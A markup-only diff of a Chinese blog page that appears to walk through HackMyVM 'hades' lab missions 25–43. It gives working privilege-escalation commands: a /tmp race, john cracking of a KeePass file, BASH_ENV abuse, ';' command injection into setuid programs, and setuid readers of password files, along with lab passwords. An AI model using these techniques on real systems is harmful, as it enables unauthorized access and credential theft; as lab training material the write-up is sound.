@@ -22,7 +22,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_Labs_hades25to50.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/217751621">
 <title>hmv_Labs_hades25to50</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -46,17 +46,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -95,349 +85,375 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <ul>
 <li><strong>任务</strong>：delia 的记忆只需要零点几秒。</li>
 </ul>
-<p>daphne 的 <code class="notranslate">sudo -l</code>：<code class="notranslate">(delia) NOPASSWD: /bin/bash -c /usr/local/src/new.sh</code>。new.sh 以 delia 身份把 delia 的密码写进 <code class="notranslate">/tmp/XXX</code>（mktemp 生成、chmod 664、<code class="notranslate">sleep 0.01</code> 后自删）：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">daphne@hades:<span class="pl-k">~</span>$ cat /usr/local/src/new.sh
-<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
-OUTPUT=<span class="pl-s"><span class="pl-pds">"</span>bNCvocyOpoMVeCtxrhTt<span class="pl-pds">"</span></span>        <span class="pl-c"><span class="pl-c">#</span> 编译期写死</span>
-secretfile=<span class="pl-s"><span class="pl-pds">$(</span>mktemp /tmp/XXX<span class="pl-pds">)</span></span>
-chmod 664 <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$secretfile</span><span class="pl-pds">"</span></span>
-<span class="pl-c1">exec</span> <span class="pl-k">5&gt;</span><span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$secretfile</span><span class="pl-pds">"</span></span>
-<span class="pl-c1">echo</span> <span class="pl-smi">$OUTPUT</span> <span class="pl-k">&gt;&amp;5</span>
+<p>daphne 的 <code>sudo -l</code>：<code>(delia) NOPASSWD: /bin/bash -c /usr/local/src/new.sh</code>。new.sh 以 delia 身份把 delia 的密码写进 <code>/tmp/XXX</code>（mktemp 生成、chmod 664、<code>sleep 0.01</code> 后自删）：</p>
+<pre lang="bash"><code>daphne@hades:~$ cat /usr/local/src/new.sh
+#!/bin/bash
+OUTPUT=&quot;bNCvocyOpoMVeCtxrhTt&quot;        # 编译期写死
+secretfile=$(mktemp /tmp/XXX)
+chmod 664 &quot;$secretfile&quot;
+exec 5&gt;&quot;$secretfile&quot;
+echo $OUTPUT &gt;&amp;5
 sleep 0.01
-rm <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$secretfile</span><span class="pl-pds">"</span></span></pre></div>
-<p>固定竞争窗口打法：先把 <code class="notranslate">/tmp/</code> 里 62³ 个三字文件名全部预占（<code class="notranslate">for a in {a..z}...; touch /tmp/${a}${b}${c}</code>），让 mktemp 反复重试拖慢到可抢读；或循环跑 new.sh 并并发读所有三字文件。</p>
+rm &quot;$secretfile&quot;
+</code></pre>
+<p>固定竞争窗口打法：先把 <code>/tmp/</code> 里 62³ 个三字文件名全部预占（<code>for a in {a..z}...; touch /tmp/${a}${b}${c}</code>），让 mktemp 反复重试拖慢到可抢读；或循环跑 new.sh 并并发读所有三字文件。</p>
 <ul>
-<li><strong>注意</strong>：delia 的 sshd 有 <code class="notranslate">Match user delia / ForceCommand /bin/bash</code>，直接 <code class="notranslate">ssh delia 'cmd'</code> 会拿不到输出；交互登录正常，非交互需用 <code class="notranslate">printf 'cmd\n' | ssh delia@...</code> 喂 stdin。</li>
-<li><strong>delia</strong>: <code class="notranslate">bNCvocyOpoMVeCtxrhTt</code></li>
+<li><strong>注意</strong>：delia 的 sshd 有 <code>Match user delia / ForceCommand /bin/bash</code>，直接 <code>ssh delia 'cmd'</code> 会拿不到输出；交互登录正常，非交互需用 <code>printf 'cmd\n' | ssh delia@...</code> 喂 stdin。</li>
+<li><strong>delia</strong>: <code>bNCvocyOpoMVeCtxrhTt</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 26: delia -&gt; demeter</h2>
 <ul>
 <li><strong>任务</strong>：demeter 读另一种文字。</li>
 </ul>
-<p>登录 delia 后终端被强制切换到画线字符集（delia 的 .bashrc 末尾有 <code class="notranslate">echo $'\e(0'</code>），需重置字形。家目录 <code class="notranslate">showpass</code>（<code class="notranslate">---x--x--x delia:delia</code>）直接打印 demeter 密码：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>\033(B<span class="pl-pds">'</span></span> <span class="pl-k">;</span> ./showpass
-FkyuXkkJNONDChoaKzOI</pre></div>
-<p>非交互验证：<code class="notranslate">printf 'id; ./showpass\nexit\n' | ssh -p 6666 delia@hades.hackmyvm.eu</code>。</p>
+<p>登录 delia 后终端被强制切换到画线字符集（delia 的 .bashrc 末尾有 <code>echo $'\e(0'</code>），需重置字形。家目录 <code>showpass</code>（<code>---x--x--x delia:delia</code>）直接打印 demeter 密码：</p>
+<pre lang="bash"><code>$ printf '\033(B' ; ./showpass
+FkyuXkkJNONDChoaKzOI
+</code></pre>
+<p>非交互验证：<code>printf 'id; ./showpass\nexit\n' | ssh -p 6666 delia@hades.hackmyvm.eu</code>。</p>
 <ul>
-<li><strong>demeter</strong>: <code class="notranslate">FkyuXkkJNONDChoaKzOI</code></li>
+<li><strong>demeter</strong>: <code>FkyuXkkJNONDChoaKzOI</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 27: demeter -&gt; echo</h2>
 <ul>
 <li><strong>任务</strong>：echo 呢？</li>
 </ul>
-<p>demeter 能读 <code class="notranslate">/usr/share/demeter</code>，里面是 echo 的密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">demeter@hades:<span class="pl-k">~</span>$ cat /usr/share/demeter
-GztROerShmiyiCIlfepG</pre></div>
+<p>demeter 能读 <code>/usr/share/demeter</code>，里面是 echo 的密码。</p>
+<pre lang="bash"><code>demeter@hades:~$ cat /usr/share/demeter
+GztROerShmiyiCIlfepG
+</code></pre>
 <ul>
-<li><strong>echo</strong>: <code class="notranslate">GztROerShmiyiCIlfepG</code></li>
+<li><strong>echo</strong>: <code>GztROerShmiyiCIlfepG</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 28: echo -&gt; eos</h2>
 <ul>
 <li><strong>任务</strong>：eos 可以看到声音。</li>
 </ul>
-<p><code class="notranslate">/pwned/echo/noise.wav</code>（5 秒白噪声），用频谱图能看到密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">echo@hades:<span class="pl-k">~</span>$ python3 -c <span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-s">import numpy as np, wave, matplotlib</span>
-<span class="pl-s">matplotlib.use('Agg'); import matplotlib.pyplot as plt</span>
-<span class="pl-s">from scipy.signal import spectrogram</span>
-<span class="pl-s">w=wave.open('noise.wav'); d=np.frombuffer(w.readframes(w.getnframes()),np.int16).reshape(-1,2).mean(1)</span>
-<span class="pl-s">f,t,S=spectrogram(d,fs=w.getframerate(),nperseg=2048,noverlap=1900)</span>
-<span class="pl-s">plt.pcolormesh(t,f,10*np.log10(S+1e-12),cmap='gray'); plt.savefig('spec.png',dpi=200)</span>
-<span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-c"><span class="pl-c">#</span> 频谱图里显示文字 CWBKRQX</span></pre></div>
+<p><code>/pwned/echo/noise.wav</code>（5 秒白噪声），用频谱图能看到密码。</p>
+<pre lang="bash"><code>echo@hades:~$ python3 -c &quot;
+import numpy as np, wave, matplotlib
+matplotlib.use('Agg'); import matplotlib.pyplot as plt
+from scipy.signal import spectrogram
+w=wave.open('noise.wav'); d=np.frombuffer(w.readframes(w.getnframes()),np.int16).reshape(-1,2).mean(1)
+f,t,S=spectrogram(d,fs=w.getframerate(),nperseg=2048,noverlap=1900)
+plt.pcolormesh(t,f,10*np.log10(S+1e-12),cmap='gray'); plt.savefig('spec.png',dpi=200)
+&quot;
+# 频谱图里显示文字 CWBKRQX
+</code></pre>
 <ul>
-<li><strong>eos</strong>: <code class="notranslate">CWBKRQX</code></li>
+<li><strong>eos</strong>: <code>CWBKRQX</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 29: eos -&gt; gaia</h2>
 <ul>
 <li><strong>任务</strong>：gaia 很小心地保存密码。</li>
 </ul>
-<p><code class="notranslate">/pwned/eos/secretz.kbdx</code> 是 KeePass 2.x 数据库。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">eos@hades:<span class="pl-k">~</span>$ keepass2john secretz.kbdx <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
-$ john <span class="pl-c1">hash</span> -w=/usr/share/wordlists/rockyou.txt
+<p><code>/pwned/eos/secretz.kbdx</code> 是 KeePass 2.x 数据库。</p>
+<pre lang="bash"><code>eos@hades:~$ keepass2john secretz.kbdx &gt; hash
+$ john hash -w=/usr/share/wordlists/rockyou.txt
 heaven           (secretz.kbdx)
-<span class="pl-c"><span class="pl-c">#</span> 用 heaven 打开数据库，提取 Gaia 的密码</span>
-$ python3 -c <span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-s">import pykeepass; kp=pykeepass.PyKeePass('secretz.kbdx',password='heaven')</span>
-<span class="pl-s">print([e.password for e in kp.entries])</span>
-<span class="pl-s"><span class="pl-pds">"</span></span>
-[<span class="pl-s"><span class="pl-pds">'</span>sbUcegcdYTTWzTKojzgm<span class="pl-pds">'</span></span>]</pre></div>
+# 用 heaven 打开数据库，提取 Gaia 的密码
+$ python3 -c &quot;
+import pykeepass; kp=pykeepass.PyKeePass('secretz.kbdx',password='heaven')
+print([e.password for e in kp.entries])
+&quot;
+['sbUcegcdYTTWzTKojzgm']
+</code></pre>
 <ul>
-<li><strong>gaia</strong>: <code class="notranslate">sbUcegcdYTTWzTKojzgm</code></li>
+<li><strong>gaia</strong>: <code>sbUcegcdYTTWzTKojzgm</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 30: gaia -&gt; halcyon</h2>
 <ul>
 <li><strong>任务</strong>：halcyon 想要所有的 powah。</li>
 </ul>
-<p>gaia 家里 <code class="notranslate">hpass1.txt</code>（可读，内容 <code class="notranslate">manuela</code>）和 <code class="notranslate">hpass2.txt</code>（root:powah 不可读）。<code class="notranslate">newgrp powah</code> 用 hpass1 的内容当组密码切换到 powah 组，就能读 hpass2。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">gaia@hades:<span class="pl-k">~</span>$ newgrp powah
+<p>gaia 家里 <code>hpass1.txt</code>（可读，内容 <code>manuela</code>）和 <code>hpass2.txt</code>（root:powah 不可读）。<code>newgrp powah</code> 用 hpass1 的内容当组密码切换到 powah 组，就能读 hpass2。</p>
+<pre lang="bash"><code>gaia@hades:~$ newgrp powah
 Password: manuela
 $ cat hpass2.txt
-cuMRRameGdmhVxHcYYYs</pre></div>
+cuMRRameGdmhVxHcYYYs
+</code></pre>
 <ul>
-<li><strong>halcyon</strong>: <code class="notranslate">cuMRRameGdmhVxHcYYYs</code></li>
+<li><strong>halcyon</strong>: <code>cuMRRameGdmhVxHcYYYs</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 31: halcyon -&gt; hebe</h2>
 <ul>
-<li><strong>任务</strong>：hebe 有一个 magicword，通过 <a href="http://localhost/req.php" rel="nofollow">http://localhost/req.php</a> 获取密码。</li>
+<li><strong>任务</strong>：hebe 有一个 magicword，通过 http://localhost/req.php 获取密码。</li>
 </ul>
-<div class="highlight highlight-source-shell"><pre class="notranslate">halcyon@hades:<span class="pl-k">~</span>$ curl -s <span class="pl-s"><span class="pl-pds">"</span>http://localhost/req.php?magicword=password<span class="pl-pds">"</span></span>
-tOlbuBLjFWntVDNmjHIG</pre></div>
+<pre lang="bash"><code>halcyon@hades:~$ curl -s &quot;http://localhost/req.php?magicword=password&quot;
+tOlbuBLjFWntVDNmjHIG
+</code></pre>
 <ul>
-<li><strong>hebe</strong>: <code class="notranslate">tOlbuBLjFWntVDNmjHIG</code></li>
+<li><strong>hebe</strong>: <code>tOlbuBLjFWntVDNmjHIG</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 32: hebe -&gt; hera</h2>
 <ul>
 <li><strong>任务</strong>：hera 拒绝用 Discord，喜欢更老的开源服务。</li>
 </ul>
 <p>靶机跑着 InspIRCd（127.0.0.1:6667）。连上 IRC，LIST 频道，topic 里就是密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">hebe@hades:<span class="pl-k">~</span>$ python3 -c <span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-s">import socket,time</span>
-<span class="pl-s">s=socket.socket(); s.connect(('127.0.0.1',6667))</span>
-<span class="pl-s">s.sendall(b'NICK p\r\nUSER p 0 0 :p\r\n')</span>
-<span class="pl-s">time.sleep(1); s.sendall(b'LIST\r\n'); time.sleep(1)</span>
-<span class="pl-s">print(s.recv(4096).decode())</span>
-<span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-c"><span class="pl-c">#</span> :hades.hmv 322 p #channel666 0 :Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM</span></pre></div>
+<pre lang="bash"><code>hebe@hades:~$ python3 -c &quot;
+import socket,time
+s=socket.socket(); s.connect(('127.0.0.1',6667))
+s.sendall(b'NICK p\r\nUSER p 0 0 :p\r\n')
+time.sleep(1); s.sendall(b'LIST\r\n'); time.sleep(1)
+print(s.recv(4096).decode())
+&quot;
+# :hades.hmv 322 p #channel666 0 :Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM
+</code></pre>
 <ul>
-<li><strong>hera</strong>: <code class="notranslate">JzpyRXRzWoHKZwgWzleM</code></li>
+<li><strong>hera</strong>: <code>JzpyRXRzWoHKZwgWzleM</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 33: hera -&gt; hermione</h2>
 <ul>
 <li><strong>任务</strong>：hermione 想知道 hera 在做什么。</li>
 </ul>
-<p>hera 的 <code class="notranslate">.bash_history</code> 里有 <code class="notranslate">sudo -u hermione bash</code>、<code class="notranslate">cat /usr/hera</code>、<code class="notranslate">rm /usr/hera</code> 等记录。<code class="notranslate">/usr/hera</code> 仍在（21 字节），里面是 hermione 的密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">hera@hades:<span class="pl-k">~</span>$ cat /usr/hera
-vzhOebSSplFoXPKxwtqU</pre></div>
+<p>hera 的 <code>.bash_history</code> 里有 <code>sudo -u hermione bash</code>、<code>cat /usr/hera</code>、<code>rm /usr/hera</code> 等记录。<code>/usr/hera</code> 仍在（21 字节），里面是 hermione 的密码。</p>
+<pre lang="bash"><code>hera@hades:~$ cat /usr/hera
+vzhOebSSplFoXPKxwtqU
+</code></pre>
 <ul>
-<li><strong>hermione</strong>: <code class="notranslate">vzhOebSSplFoXPKxwtqU</code></li>
+<li><strong>hermione</strong>: <code>vzhOebSSplFoXPKxwtqU</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 34: hermione -&gt; hero</h2>
 <ul>
 <li><strong>任务</strong>：hero 只和某些组说话。</li>
 </ul>
-<p><code class="notranslate">/pwned/hermione/beastgroup</code> 是 SUID 程序，检查 egid 是否为 6666（beast 组）。hermione 在 beast 组（附属），用 <code class="notranslate">sg</code> 切换主组再运行。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">hermione@hades:<span class="pl-k">~</span>$ sg beast -c <span class="pl-s"><span class="pl-pds">"</span>./beastgroup<span class="pl-pds">"</span></span>
-vlImTDSGnTMwLFgRWCOc</pre></div>
+<p><code>/pwned/hermione/beastgroup</code> 是 SUID 程序，检查 egid 是否为 6666（beast 组）。hermione 在 beast 组（附属），用 <code>sg</code> 切换主组再运行。</p>
+<pre lang="bash"><code>hermione@hades:~$ sg beast -c &quot;./beastgroup&quot;
+vlImTDSGnTMwLFgRWCOc
+</code></pre>
 <ul>
-<li><strong>hero</strong>: <code class="notranslate">vlImTDSGnTMwLFgRWCOc</code></li>
+<li><strong>hero</strong>: <code>vlImTDSGnTMwLFgRWCOc</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 35: hero -&gt; hestia</h2>
 <ul>
 <li><strong>任务</strong>：hestia 喜欢保持屏幕干净。</li>
 </ul>
-<p><code class="notranslate">/pwned/hero/cleaner</code> 是 setuid root 的 bash，降权到 hero 后跑 <code class="notranslate">clear</code>。内置 PATH 含 <code class="notranslate">.</code>（当前目录），且 bash 会 source <code class="notranslate">BASH_ENV</code>。在可写可执行的目录（/run/lock）放一个 <code class="notranslate">clear</code> 脚本，但 PATH 劫持无效（降权后 PATH 被重置）。改用 BASH_ENV：cleaner 进程带 her0 组，能读 <code class="notranslate">/usr/share/libs</code>（root:her0 640）。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">hero@hades:<span class="pl-k">~</span>$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>cat /usr/share/libs &gt; /run/lock/x\n<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /run/lock/evil
-hero@hades:<span class="pl-k">~</span>$ BASH_ENV=/run/lock/evil /pwned/hero/cleaner
-hero@hades:<span class="pl-k">~</span>$ cat /run/lock/x
-opTNnZQAuFJsauNPHXVq</pre></div>
+<p><code>/pwned/hero/cleaner</code> 是 setuid root 的 bash，降权到 hero 后跑 <code>clear</code>。内置 PATH 含 <code>.</code>（当前目录），且 bash 会 source <code>BASH_ENV</code>。在可写可执行的目录（/run/lock）放一个 <code>clear</code> 脚本，但 PATH 劫持无效（降权后 PATH 被重置）。改用 BASH_ENV：cleaner 进程带 her0 组，能读 <code>/usr/share/libs</code>（root:her0 640）。</p>
+<pre lang="bash"><code>hero@hades:~$ printf 'cat /usr/share/libs &gt; /run/lock/x\n' &gt; /run/lock/evil
+hero@hades:~$ BASH_ENV=/run/lock/evil /pwned/hero/cleaner
+hero@hades:~$ cat /run/lock/x
+opTNnZQAuFJsauNPHXVq
+</code></pre>
 <ul>
-<li><strong>hestia</strong>: <code class="notranslate">opTNnZQAuFJsauNPHXVq</code></li>
+<li><strong>hestia</strong>: <code>opTNnZQAuFJsauNPHXVq</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 36: hestia -&gt; ianthe</h2>
 <ul>
 <li><strong>任务</strong>：ianthe 留给我们她自己的 less。</li>
 </ul>
-<p><code class="notranslate">/pwned/hestia/less</code> 是 setuid ianthe 的 less。<code class="notranslate">!</code>/<code class="notranslate">|</code> 命令被禁用，但能以 ianthe 身份<strong>读取</strong>文件。<code class="notranslate">/opt/ianthe_pass.txt</code>（ianthe:ianthe 640）用 less 打开抓屏。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">hestia@hades:<span class="pl-k">~</span>$ ./less /opt/ianthe_pass.txt
-<span class="pl-c"><span class="pl-c">#</span> 屏幕显示: DphioLqgVIIFclTwBsMP</span></pre></div>
+<p><code>/pwned/hestia/less</code> 是 setuid ianthe 的 less。<code>!</code>/<code>|</code> 命令被禁用，但能以 ianthe 身份<strong>读取</strong>文件。<code>/opt/ianthe_pass.txt</code>（ianthe:ianthe 640）用 less 打开抓屏。</p>
+<pre lang="bash"><code>hestia@hades:~$ ./less /opt/ianthe_pass.txt
+# 屏幕显示: DphioLqgVIIFclTwBsMP
+</code></pre>
 <ul>
-<li><strong>ianthe</strong>: <code class="notranslate">DphioLqgVIIFclTwBsMP</code></li>
+<li><strong>ianthe</strong>: <code>DphioLqgVIIFclTwBsMP</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 37: ianthe -&gt; irene</h2>
 <ul>
-<li><strong>任务</strong>：irene 在开发认证系统 <a href="http://localhost/irene_auth.php%EF%BC%8C%E5%8F%AA%E7%94%A8%E9%BB%98%E8%AE%A4" rel="nofollow">http://localhost/irene_auth.php，只用默认</a> admin 密码。</li>
+<li><strong>任务</strong>：irene 在开发认证系统 http://localhost/irene_auth.php，只用默认 admin 密码。</li>
 </ul>
-<p>需要 <code class="notranslate">Origin: hackmyvm.hmv</code> 头，POST admin/admin 登录后输出密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ianthe@hades:<span class="pl-k">~</span>$ curl -s -H <span class="pl-s"><span class="pl-pds">"</span>Origin: hackmyvm.hmv<span class="pl-pds">"</span></span> -X POST -d <span class="pl-s"><span class="pl-pds">"</span>username=admin&amp;password=admin<span class="pl-pds">"</span></span> http://localhost/irene_auth.php
-TDyuLyWLDksEhgmAYDJC</pre></div>
+<p>需要 <code>Origin: hackmyvm.hmv</code> 头，POST admin/admin 登录后输出密码。</p>
+<pre lang="bash"><code>ianthe@hades:~$ curl -s -H &quot;Origin: hackmyvm.hmv&quot; -X POST -d &quot;username=admin&amp;password=admin&quot; http://localhost/irene_auth.php
+TDyuLyWLDksEhgmAYDJC
+</code></pre>
 <ul>
-<li><strong>irene</strong>: <code class="notranslate">TDyuLyWLDksEhgmAYDJC</code></li>
+<li><strong>irene</strong>: <code>TDyuLyWLDksEhgmAYDJC</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 38: irene -&gt; iris</h2>
 <ul>
 <li><strong>任务</strong>：iris 讨厌某些字符。</li>
 </ul>
-<p><code class="notranslate">/pwned/irene/hatechars</code> 是 setuid root 的 bash，降权到 iris，跑 <code class="notranslate">cat &lt;输入&gt;</code>，过滤掉 <code class="notranslate">a e t . *</code> 五个字符。其余字符（含 <code class="notranslate">;</code> 等 shell 元字符）都允许 → 命令注入。注入以 iris 身份执行，读 <code class="notranslate">/etc/met.txt</code>（iris:iris 640）。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">irene@hades:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>;id<span class="pl-pds">"</span></span> <span class="pl-k">|</span> ./hatechars   <span class="pl-c"><span class="pl-c">#</span> uid=2030(iris)</span>
-irene@hades:<span class="pl-k">~</span>$ mkdir -p /run/lock/x
-irene@hades:<span class="pl-k">~</span>$ cat <span class="pl-k">&gt;</span> /run/lock/x/mx1 <span class="pl-s"><span class="pl-k">&lt;&lt;</span>'<span class="pl-k">S</span>'</span>
-<span class="pl-s">cat /etc/met.txt</span>
-<span class="pl-s"><span class="pl-k">S</span></span>
-irene@hades:<span class="pl-k">~</span>$ chmod 755 /run/lock/x/mx1
-irene@hades:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>;/run/lock/x/mx1<span class="pl-pds">"</span></span> <span class="pl-k">|</span> ./hatechars
-FiqGNcXumTKwLTPRqXMh</pre></div>
+<p><code>/pwned/irene/hatechars</code> 是 setuid root 的 bash，降权到 iris，跑 <code>cat &lt;输入&gt;</code>，过滤掉 <code>a e t . *</code> 五个字符。其余字符（含 <code>;</code> 等 shell 元字符）都允许 → 命令注入。注入以 iris 身份执行，读 <code>/etc/met.txt</code>（iris:iris 640）。</p>
+<pre lang="bash"><code>irene@hades:~$ echo &quot;;id&quot; | ./hatechars   # uid=2030(iris)
+irene@hades:~$ mkdir -p /run/lock/x
+irene@hades:~$ cat &gt; /run/lock/x/mx1 &lt;&lt;'S'
+cat /etc/met.txt
+S
+irene@hades:~$ chmod 755 /run/lock/x/mx1
+irene@hades:~$ echo &quot;;/run/lock/x/mx1&quot; | ./hatechars
+FiqGNcXumTKwLTPRqXMh
+</code></pre>
 <ul>
-<li><strong>iris</strong>: <code class="notranslate">FiqGNcXumTKwLTPRqXMh</code></li>
+<li><strong>iris</strong>: <code>FiqGNcXumTKwLTPRqXMh</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 39: iris -&gt; kore</h2>
 <ul>
 <li><strong>任务</strong>：kore 喜欢导航！</li>
 </ul>
-<p><code class="notranslate">/usr/bin/w3m</code> 是 setuid kore 的文本浏览器。以 kore 身份用 <code class="notranslate">w3m -dump file://</code> 读 <code class="notranslate">/srv/kore_pass.txt</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">iris@hades:<span class="pl-k">~</span>$ /usr/bin/w3m -dump file:///srv/kore_pass.txt
-mdAXiSXteTPiGGTpmajP</pre></div>
+<p><code>/usr/bin/w3m</code> 是 setuid kore 的文本浏览器。以 kore 身份用 <code>w3m -dump file://</code> 读 <code>/srv/kore_pass.txt</code>。</p>
+<pre lang="bash"><code>iris@hades:~$ /usr/bin/w3m -dump file:///srv/kore_pass.txt
+mdAXiSXteTPiGGTpmajP
+</code></pre>
 <ul>
-<li><strong>kore</strong>: <code class="notranslate">mdAXiSXteTPiGGTpmajP</code></li>
+<li><strong>kore</strong>: <code>mdAXiSXteTPiGGTpmajP</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 40: kore -&gt; leda</h2>
 <ul>
 <li><strong>任务</strong>：leda 一直想编辑视频。</li>
 </ul>
-<p><code class="notranslate">/usr/bin/ffmpeg</code> 是 setuid leda 的。<code class="notranslate">/etc/led</code>（leda:leda 640，14 字节）是密码文件。用 ffmpeg rawvideo 把字节复制出来。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">kore@hades:<span class="pl-k">~</span>$ /usr/bin/ffmpeg -f rawvideo -s 1x1 -pix_fmt gray -i /etc/led -f rawvideo -s 1x1 -pix_fmt gray -y /run/lock/o <span class="pl-k">2&gt;</span>/dev/null
-kore@hades:<span class="pl-k">~</span>$ cat /run/lock/o
-NODEVILINHELL</pre></div>
+<p><code>/usr/bin/ffmpeg</code> 是 setuid leda 的。<code>/etc/led</code>（leda:leda 640，14 字节）是密码文件。用 ffmpeg rawvideo 把字节复制出来。</p>
+<pre lang="bash"><code>kore@hades:~$ /usr/bin/ffmpeg -f rawvideo -s 1x1 -pix_fmt gray -i /etc/led -f rawvideo -s 1x1 -pix_fmt gray -y /run/lock/o 2&gt;/dev/null
+kore@hades:~$ cat /run/lock/o
+NODEVILINHELL
+</code></pre>
 <ul>
-<li><strong>leda</strong>: <code class="notranslate">NODEVILINHELL</code></li>
+<li><strong>leda</strong>: <code>NODEVILINHELL</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 41: leda -&gt; maia</h2>
 <ul>
 <li><strong>任务</strong>：maia 听到一切。</li>
 </ul>
-<p>leda 能 <code class="notranslate">sudo -u maia espeak</code>。<code class="notranslate">/etc/maia.txt</code>（root:maia 640，15 字节）是密码。espeak 读它发声，但无音频设备；用 <code class="notranslate">-x</code> 输出音素，或 <code class="notranslate">-w</code> 写 wav 后用 STT 识别。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">leda@hades:<span class="pl-k">~</span>$ sudo -u maia espeak -x -f /etc/maia.txt
-g<span class="pl-s"><span class="pl-pds">'</span>IvI2m,i:nju:m,aInd</span>
-<span class="pl-s">leda@hades:~$ sudo -u maia espeak -f /etc/maia.txt -w /run/lock/maia.wav</span>
-<span class="pl-s"># 用 vosk 转录 → "maybe your mind"（同音误识），实际密码是 GIVEMEANEWMIND</span></pre></div>
+<p>leda 能 <code>sudo -u maia espeak</code>。<code>/etc/maia.txt</code>（root:maia 640，15 字节）是密码。espeak 读它发声，但无音频设备；用 <code>-x</code> 输出音素，或 <code>-w</code> 写 wav 后用 STT 识别。</p>
+<pre lang="bash"><code>leda@hades:~$ sudo -u maia espeak -x -f /etc/maia.txt
+g'IvI2m,i:nju:m,aInd
+leda@hades:~$ sudo -u maia espeak -f /etc/maia.txt -w /run/lock/maia.wav
+# 用 vosk 转录 → &quot;maybe your mind&quot;（同音误识），实际密码是 GIVEMEANEWMIND
+</code></pre>
 <ul>
-<li><strong>maia</strong>: <code class="notranslate">GIVEMEANEWMIND</code></li>
+<li><strong>maia</strong>: <code>GIVEMEANEWMIND</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 42: maia -&gt; nephele</h2>
 <ul>
 <li><strong>任务</strong>：nephele 弄坏了图像。</li>
 </ul>
-<p><code class="notranslate">/pwned/maia/broken</code> 是 PNG，但签名前 4 字节 <code class="notranslate">00 00 00 00</code> 应为 <code class="notranslate">89 50 4E 47</code>。修复后 OCR。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">maia@hades:<span class="pl-k">~</span>$ python3 -c <span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-s">d=bytearray(open('broken','rb').read()); d[0:4]=bytes([0x89,0x50,0x4e,0x47]); open('f.png','wb').write(d)<span class="pl-pds">"</span></span>
+<p><code>/pwned/maia/broken</code> 是 PNG，但签名前 4 字节 <code>00 00 00 00</code> 应为 <code>89 50 4E 47</code>。修复后 OCR。</p>
+<pre lang="bash"><code>maia@hades:~$ python3 -c &quot;
+d=bytearray(open('broken','rb').read()); d[0:4]=bytes([0x89,0x50,0x4e,0x47]); open('f.png','wb').write(d)&quot;
 $ tesseract f.png stdout --psm 6
-rZtaitCxlEIRxBayVpgZ</pre></div>
+rZtaitCxlEIRxBayVpgZ
+</code></pre>
 <ul>
-<li><strong>nephele</strong>: <code class="notranslate">rZtaitCxlEIRxBayVpgZ</code></li>
+<li><strong>nephele</strong>: <code>rZtaitCxlEIRxBayVpgZ</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 43: nephele -&gt; nyx</h2>
 <ul>
 <li><strong>任务</strong>：nyx 访问一些我们不知道的网站。</li>
 </ul>
